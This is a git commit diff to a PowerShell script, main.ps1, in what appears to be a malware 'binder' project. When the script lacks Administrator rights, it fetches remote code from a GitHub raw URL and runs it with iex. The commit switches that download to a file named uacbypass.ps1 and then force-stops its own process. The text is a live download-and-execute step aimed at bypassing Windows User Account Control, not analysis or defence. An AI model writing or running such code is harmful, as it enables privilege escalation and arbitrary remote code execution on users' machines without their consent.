e4b7f1a163aaf740701e8d9ad027b47d309f05d7
43a1723 <hai1723notgay@gmail.com>
2024-06-29 16:54:19 +0700

    Update main.ps1

--- file/main.ps1
+++ file/main.ps1
@@ -1,5 +1,5 @@
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    iex (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/s1uiasdad/binder/main/file/admin.ps1" -UseBasicParsing).Content
+    iex (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/s1uiasdad/binder/main/file/uacbypass.ps1" -UseBasicParsing).Content
     Stop-Process $pid -Force
 }
 
